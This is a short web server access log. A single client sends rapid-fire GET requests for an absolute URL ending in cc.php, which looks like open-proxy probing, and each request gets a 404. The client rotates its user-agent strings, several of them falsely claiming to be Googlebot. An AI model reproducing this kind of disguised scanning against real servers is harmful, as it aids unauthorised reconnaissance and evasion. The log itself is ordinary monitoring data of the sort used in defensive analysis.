::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko"
::ffff:151.106.34.159 - - [22/Jul/2023:11:20:49 +0000] "GET http://8.219.177.107/c/cc.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36"
